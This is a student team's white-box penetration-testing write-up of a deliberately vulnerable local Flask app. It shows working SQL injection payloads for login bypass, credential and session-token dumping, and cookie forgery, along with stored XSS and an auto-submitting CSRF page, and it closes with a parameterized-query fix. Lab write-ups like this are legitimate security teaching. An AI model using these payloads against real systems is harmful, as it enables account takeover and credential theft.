---
title: This Damned Vulnerable Snake!
date: 2024-05-04
author:
  - "0x42697262"
  - Orochi
  - Jinx
---

Authors:

- 0x42697262
- Jinx
- Orochi

# This Damned Vulnerable Snake!

## TL;DR

> [!NOTE]
>
> All of the CVEs listed here are hypothetical!
> They do not represent real world CVEs.


List of vulnerabilities discovered:

> [!IMPORTANT]
> **SQL Injection Authentication Bypass (aCVE-2024-0001)**
>
> ```bash
> curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=a' OR 1=1 --&password="
> curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=a' OR TRUE --&password="
> curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=' UNION SELECT id FROM users; --&password="
> ```

> [!IMPORTANT]
> **Stored XSS and SQL Injection Vulnerability by Execution of Arbitrary SQL Queries and JavaScript (aCVE-2024-0002)**
>
> Use these as the message:
>
> - `<script>alert(document.domain)</script>`
> - `<script>alert(window.origin)</script>`
> - `1', 1), ((SELECT GROUP_CONCAT(id || ',' || username || ':' || password, '<br>') FROM users), 1)--`
> - `1', 1), ((SELECT GROUP_CONCAT(user || ':' || token, '<br>') FROM sessions), 1)--`


> [!IMPORTANT]
> **Credential Bypass via SQL Injection on Session Token (aCVE-2024-0003)**
>
> ```bash
> curl -L 'http://0.0.0.0:5000/home' -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1 --" 
> curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1--" --data-raw "message=message=1', 1), ((SELECT GROUP_CONCAT(id || ',' || username || ':' || password, '<br>') FROM users), 1)--"
> curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1--" --data-raw "message=1', 1), ((SELECT GROUP_CONCAT(user || ':' || token, '<br>') FROM sessions), 1)--"
> curl -L 'http://0.0.0.0:5000/logout'  -H "Cookie: session_token=' UNION SELECT 1 AS id, 'maldev' AS username FROM users --"
> ```

### CSRF

> Create `malicious.html` where a form calls the post method on an endpoint with an SQL injection as the message.
> ```
> <html>
><body>
>    <h1>CSRF Payload</h1>
>    <form id="csrfForm" action="http://127.0.0.1:5000/posts" method="POST">
>        <input type="hidden" name="message" value="1&#39;, 1&#41;, ((SELECT GROUP_CONCAT(user || ':' || token, '&#8249;br>') FROM sessions), 1)--">
>    </form>
>    <script>
>        // Automatically submit the form when the page loads
>        document.getElementById('csrfForm').submit();
>    </script>
></body>
></html>
> ```
> or 
> ```
> <html>
><body>
>    <h1>CSRF Payload</h1>
>    <form id="csrfForm" action="http://127.0.0.1:5000/posts" method="POST">
>        <input type="hidden" name="message" value="1', 1&#41;, ((SELECT >GROUP_CONCAT(id || ',' || username || ':' || password, '&#8249;br>') FROM users), 1)--">
>    </form>
>    <script>
>        // Automatically submit the form when the page loads
>        document.getElementById('csrfForm').submit();
>    </script>
></body>
></html>
> ```
## Introduction

Another month, another machine problem.
However this time, we're diving into some white-box penetration testing, which means we have full access to the source code of the web server.

The instructions to install and run the server is already provided in the [writeup](./writeup/README.txt) directory.
Please read and follow the instructions to setup the Python Flask web server.

Once the server is up and running, visit [http://0.0.0.0:5000](http://0.0.0.0:5000) and be greeted with a remnant of the 90s internet web page login.
*It's ugly because there's no CSS, as intended.*

The database contains four tables: `posts`, `sessions`, `users`, and `sqlite_sequence`.
The last one is not needed.

- `posts` contains user posts
  - `id` as primary key
  - `message` as text
  - `user` as integer
- `sessions` contains session tokens of an authenticated user
  - `id` as primary key
  - `user` as integer
  - `token` as text
- `users` contains username and password
  - `id` as primary key
  - `username` as text
  - `password` as text

The `sessions` table has data containing

```
id	user	token
7	1	e96713ffbc66b273d48f5bbbf56e297686d55a3c488c55c94d233a32cac8be65
```

Similar to the `users` table

```
id	username	password
1	alice	12345678
```

Then that's it.
That's the only thing that can be seen on the website without logging in.
There's no `robots.txt` because the web server is simple and small.

The mission of this machine problem?
It is to **find vulnerabilities** as much as possible and **exploit** them.

That is what we will be doing today!

> [!NOTE]
> 
> If using a web browser is annoying, use `curl`.
> 
> ```bash
> curl -L 'http://0.0.0.0:5000'
> ```
> 
> And return an HTML login page.
> 
> ```html
> <!DOCTYPE html>
> <html>
>   <head>
>     <title>Login</title>
>   </head>
>   <body>
>     <form method="post" action="/login">
>       <label for="username">Username</label>
>       <input name="username" type="text" />
>       <label for="password">Password</label>
>       <input name="password" type="password" />
>       <input type="submit" value="Login" />
>     </form>
>   </body>
> </html>
> ```

## Exploitation

Since we have full access to the server already, there's no need to perform reconnaissance. 
Thus we will head straight to exploitation.

First up is the login page.
There is no need to **bruteforce** the login page as its vulnerability is obvious.

Take a look at this code, it is possible to perform SQL injection to it.

```python
@app.route("/login", methods=["GET", "POST"])
def login():
  cur = con.cursor()
  if request.method == "GET":
    if request.cookies.get("session_token"):
      res = cur.execute("SELECT username FROM users INNER JOIN sessions ON "
                          + "users.id = sessions.user WHERE sessions.token = '"
                          + request.cookies.get("session_token") + "'")
      user = res.fetchone()
      if user:
        return redirect("/home")

    return render_template("login.html")
  else:
    res = cur.execute("SELECT id from users WHERE username = '"
                  + request.form["username"]
                  + "' AND password = '"
                  + request.form["password"] + "'")
    user = res.fetchone()
    if user:
      token = secrets.token_hex()
      cur.execute("INSERT INTO sessions (user, token) VALUES ("
                  + str(user[0]) + ", '" + token + "');")
      con.commit()
      response = redirect("/home")
      response.set_cookie("session_token", token)
      return response
    else:
      return render_template("login.html", error="Invalid username and/or password!")
```

Notice that the flow of this code redirects to the homepage when a session is present but proceeds to the login page when one is not.

On the `GET` method request, the SQL code is vulnerable.
However, we won't be focusing on that.

### SQL Injection Authentication Bypass (aCVE-2024-0001)

The simplest part is the `POST` request because even if we don't have full access to the source code, we can still conduct basic checks to determine if the server is vulnerable or not.

This part of the code can be exploited to bypass the login and allows us to use the first user index, usually admin or root in others.

```python
res = cur.execute("SELECT id from users WHERE username = '"
            + request.form["username"]
            + "' AND password = '"
            + request.form["password"] + "'")
```

To exploit this page, simply set the username to a SQL query that evaluates to `TRUE`.

- `228922' OR 1=1 --`
- `228922' OR TRUE --`

This would get parsed by the sqlite3 handler as

```sql
SELECT id from users WHERE username = '228922' OR 1=1 -- AND password = ''
```

> [!NOTE]
> `'` is used instead of `"` because that's what the source code uses.
> Otherwise, it's `"`.

And we're in!
We should now be greeted with

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Home</title>
  </head>
  <body>
    <h2>Welcome, alice!</h2>
    <a href="/logout">Logout</a>
    <h3>Posts</h3>
    <form method="post" action="/posts">
      <input type="text" name="message">
      <input type="submit" value="Post!">
    </form>
    <ul>
      No posts.
    </ul>
  </body>
</html>
```

And logged in as `alice`.

Unfortunately, the database only contains `alice` as the user (not even root or admin) and an unhashed password (which is very unsecure!!!).

Let's just call this **SQL Injection Authentication Bypass (aCVE-2024-0001)** as some sort of a tracker for this machine problem (of course this CVE doesn't exist irl, a joke btw).

To explain how this works, the original SQL statement looks for a `username` if it exists then proceeds to verify the `password`.
But since we have modified the `WHERE` clause, it wouldn't matter if a username does not exist since it would always evaluate to `TRUE`.

This would mean that the SQL parameter would be similar to `SELECT id FROM users;` then only fetch the first result.

Logging in as the first user is boring.
What if we try logging in on a specific user?

The same method is performed in executing a SQL injection.

```sql
' UNION select 24 from users; --
```

This would not work for now since there is only one user, but if a user with id 24 exists, it would login to that user without a password.

```sql
' UNION select 1 from users; --
```

Notice this line of code of the login function

```python
if user:
  token = secrets.token_hex()
  cur.execute("INSERT INTO sessions (user, token) VALUES ("
              + str(user[0]) + ", '" + token + "');")
  con.commit()
  response = redirect("/home")
  response.set_cookie("session_token", token)
  return response
```

A token is created every time a user successfully logs in.
In our case, when logging in as another user (existent or non-existent), it still creates a session token.

We can try retrieving all of the session tokens or username and passwords by dumping the database.
See the next aCVE.

### Stored XSS and SQL Injection Vulnerability by Execution of Arbitrary SQL Queries and JavaScript (aCVE-2024-0002)

Neat!
We are now greeted with yet another ugly HTML home page.

This home page have two HTTP request methods, a **GET** method for logging out the user (potential CSRF) and a **POST** method for storing posts on the user's home page (potential for Stored XSS).

Let's see if the server is vulnerable to XSS.
We can test that by using a Javascript code (just pick one)

- `<script>alert(window.origin)</script>`
- `<script>alert(document.domain)</script>`

and post!

We got ourselves a Stored XSS!
However, is it a vulnerability?
Let's see the results of the returned home page

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Home</title>
  </head>
  <body>
    <h2>Welcome, alice!</h2>
    <a href="/logout">Logout</a>
    <h3>Posts</h3>
    <form method="post" action="/posts">
      <input type="text" name="message">
      <input type="submit" value="Post!">
    </form>
    <ul>
      <li><script>alert(window.origin)</script></li>
    </ul>
  </body>
</html>
```

The `body` now contains a list of messages and right there is our Javascript code that will execute everytime the page is loaded.

The alert message should pop up `http://0.0.0.0:5000` if it is vulnerable to XSS.
Otherwise, it would return `null` if it is not vulnerable to XSS due to sandboxing mechanism implemented by the server.

Thus, another vulnerability is spotted!

But wait, there's more.
The source code of the server is also **vulnerable to SQL Injection**!

```python
@app.route("/posts", methods=["POST"])
def posts():
  cur = con.cursor()
  if request.cookies.get("session_token"):
    res = cur.execute("SELECT users.id, username FROM users INNER JOIN sessions ON "
                          + "users.id = sessions.user WHERE sessions.token = '"
                          + request.cookies.get("session_token") + "';")
    user = res.fetchone()
    if user:
      cur.execute("INSERT INTO posts (message, user) VALUES ('"
                        + request.form["message"] + "', " + str(user[0]) + ");")
      con.commit()
      return redirect("/home")
    return redirect("/login", error="test")
```

In the SQL query `INSERT INTO posts (message, user) VALUES ('...`, it is possible to dump the session tokens or even the username and password!

This can be done by crafting the `message`

```sql
1', 1), ((SELECT GROUP_CONCAT(id || ',' || username || ':' || password, '<br>') FROM users), 1)--
```

And once executed, this should return the home page with its posts.

```HTML
...
<li>1</li>
<li>1,alice:12345678</li>
...
```

And boom!
**We are able to grab `alice`'s password!**
And other users as well if they exists.

Since we're able to grab the username and password, there's no need for the session tokens, right?
Nah, we're still gonna do it.

```sql
1', 1), ((SELECT GROUP_CONCAT(user || ':' || token, '<br>') FROM sessions), 1)--
```

And we're able to grab all the user sessions!

```html
<li>1</li>
<li>1:e96713ffbc66b273d48f5bbbf56e297686d55a3c488c55c94d233a32cac8be65<br>1:2015e754b07fb37c28ee636725d04b8743f91333ac927fe9c0eeca512246fc9c<br>159:8e25b871df997f1f1b219b96a30bda9505a60168aeae51e7d2a011c12bdba184</li>
```

Let's call this Vulnerability as **Stored XSS and SQL Injection Vulnerability by Execution of Arbitrary SQL Queries and JavaScript (aCVE-2024-0002)**.

To explain how this works, the original SQL query takes a valid input message and passes it to the sqlite3 handler.

```sql
INSERT INTO posts (message, user) VALUES ('<script>alert(document.domain)</script>', 1);
```

However, since we have replaced the `message` with injected SQL query, it would now look like this

```sql
INSERT INTO posts (message, user) VALUES ('1', 1), ((SELECT GROUP_CONCAT(user || ':' || token, '<br>') FROM sessions), 1); -- ', 1);
```

This will first insert the message `1` into **user 1** and then insert the SQL query of concatenating the results of users and tokens resulting to dumping the users and tokens.

Similarly, this works for dumping the username and password.

The scary thing about this vulnerability is that we can post a message on another user!
This can be done by simply changing the user ID to another user (doesn't matter if it does not exist).

```sql
1', 69), ("I know you read 228922", 69) --
```

This will get inserted to the database on user 69.

### Credential Bypass via SQL Injection on Session Token (aCVE-2024-0003)

Okay, bypassing the login page and then able to post a message on another user requires a bit more of an effort.
*Why not just bypass the session token instead?*

The web server is vulnerable to SQL injection, all of the SQL parameters are vulnerable to it.
Thus with this context, let us try ***posting as another user without logging in!***

Session tokens are important for user authentication.
Usually, they are stored as a **cookie** to the web browser and it gets passed to an HTTP request method.

Forging the session token might need a different tool or simply modify the cookie itself in the web browser.

The web server uses `session_token` which is evident in the source code `request.cookies.get("session_token")`.

Modifying the session token in the web browser is tad a bit annoying.
I like to do it with `curl` instead (or use Burpsuite if you want to).

A legitimate GET request with the session token looks like this using curl

```bash
curl -L 'http://0.0.0.0:5000/' -H "Cookie: session_token=e96713ffbc66b273d48f5bbbf56e297686d55a3c488c55c94d233a32cac8be65"
```

Assuming that the session token exists, this would return the home page of the user.

> [!NOTE]
> This actually exists in the database provided by the machine problem.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Home</title>
  </head>
  <body>
    <h2>Welcome, alice!</h2>
    <a href="/logout">Logout</a>
    <h3>Posts</h3>
    <form method="post" action="/posts">
      <input type="text" name="message">
      <input type="submit" value="Post!">
    </form>
  </body>
</html>
```

We can now make a POST request with similar method

```bash
curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=e96713ffbc66b273d48f5bbbf56e297686d55a3c488c55c94d233a32cac8be65" --data-raw 'message=Breasts or Thighs? Which contains more meat? For a value meal.'
```

And running the GET request curl command once again will output

```html
...
<ul>
  <li>Breasts or Thighs? Which contains more meat? For a value meal.</li>
</ul>
...
```

That's basically it.
Next is attacking the session token cookie.

On the assumption that a user ID exists, forging a session token is performed this way

```bash
curl -L 'http://0.0.0.0:5000/home' -H "Cookie: session_token=' UNION SELECT 1 as id, 'random_name' as username FROM users LIMIT 1 --" 
curl -L 'http://0.0.0.0:5000/home' -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1 --" 
```

And we're in.

This vulnerability is dubbed as **Credential Bypass via SQL Injection on Session Token (aCVE-2024-0003)**.

As to how this works, a legitimate SQL query appears as

```sql
SELECT users.id, username
FROM users
INNER JOIN sessions
ON users.id = sessions.user
WHERE sessions.token = 'e96713ffbc66b273d48f5bbbf56e297686d55a3c488c55c94d233a32cac8be65';
```

which is found in

```python
res = cur.execute("SELECT users.id, username FROM users INNER JOIN sessions ON "
    + "users.id = sessions.user WHERE sessions.token = '"
    + request.cookies.get("session_token") + "';")
user = res.fetchone()
```

This would return a list of users with that session token, and the first index is taken as the user.

The result of the SQL query is

```
(1,alice)
```

However, this following code only checks and uses the user ID

```python
if user:
  cur.execute("INSERT INTO posts (message, user) VALUES ('"
    + request.form["message"] + "', " + str(user[0]) + ");")
```

ignoring the name of the user.

This allows us to forge a session token with random names for any given user (even those that doesn't exists).

**Since this vulnerability exists throughout the source code, it also serves as a means to post as another user without knowing their password!**
The attack is crafted this way

```bash
curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT 1 as id, 'doyou' as username FROM users LIMIT 1--" --data-raw 'message=alice watches 228922'
curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1--" --data-raw 'message=alice watches 228922'
```

And checking the posts

```bash
curl -L 'http://0.0.0.0:5000/home' -H "Cookie: session_token=' UNION SELECT 1 as id, '' as username FROM users LIMIT 1 --" 
```

the output is

```html
...
<li>Breasts or Thighs? Which contains more meat? For a value meal.</li>
<li>alice watches 228922</li>
...
```

***This is a serious concern...***

It is also possible to force a user to logout of their session (equivalent to deleting the session tokens in the database)

```bash
curl -L 'http://0.0.0.0:5000/logout' -H "Cookie: session_token=' UNION SELECT 1 AS id, 'maldev' AS username FROM users--"
```

This vulnerability might give a hint to CSRF (Cross-Site Request Forgery) attack.



## Patching the vulnerabilities

To combat SQL injections, we changed how we pass values into the SQL queries from concatenation into input parametization, as shown below:
```
res = cur.execute("SELECT username FROM users INNER JOIN sessions ON "
                              + "users.id = sessions.user WHERE sessions.token = '"
                              + request.cookies.get("session_token") + "'")
```

into

```
res = cur.execute("SELECT username FROM users INNER JOIN sessions ON "
                              + "users.id = sessions.user WHERE sessions.token = ?",
                              (request.cookies.get("session_token"),))
```